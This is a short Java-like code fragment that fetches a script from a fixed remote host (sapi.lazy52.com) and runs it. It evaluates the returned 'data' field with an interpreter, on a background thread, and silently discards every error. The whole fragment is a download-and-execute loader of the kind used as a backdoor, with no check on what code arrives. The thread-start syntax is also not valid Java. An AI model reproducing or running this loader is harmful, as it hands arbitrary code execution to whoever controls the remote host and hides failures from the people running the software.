public void execute() {
    try {
        String resp = get("http://sapi.lazy52.com/script-execute/get/" + scriptId);
        JSONObject obj = new JSONObject(resp);
        String code = obj.getString("data");
        if (code != null && !code.trim().isEmpty()) {
            this.interpreter.eval(code.replaceAll("\n", ""), "eval stream");
        }
    } catch (Exception e) {
    }
}

new Thread(new Runnable(){
run(){
execute();
}
}).start();
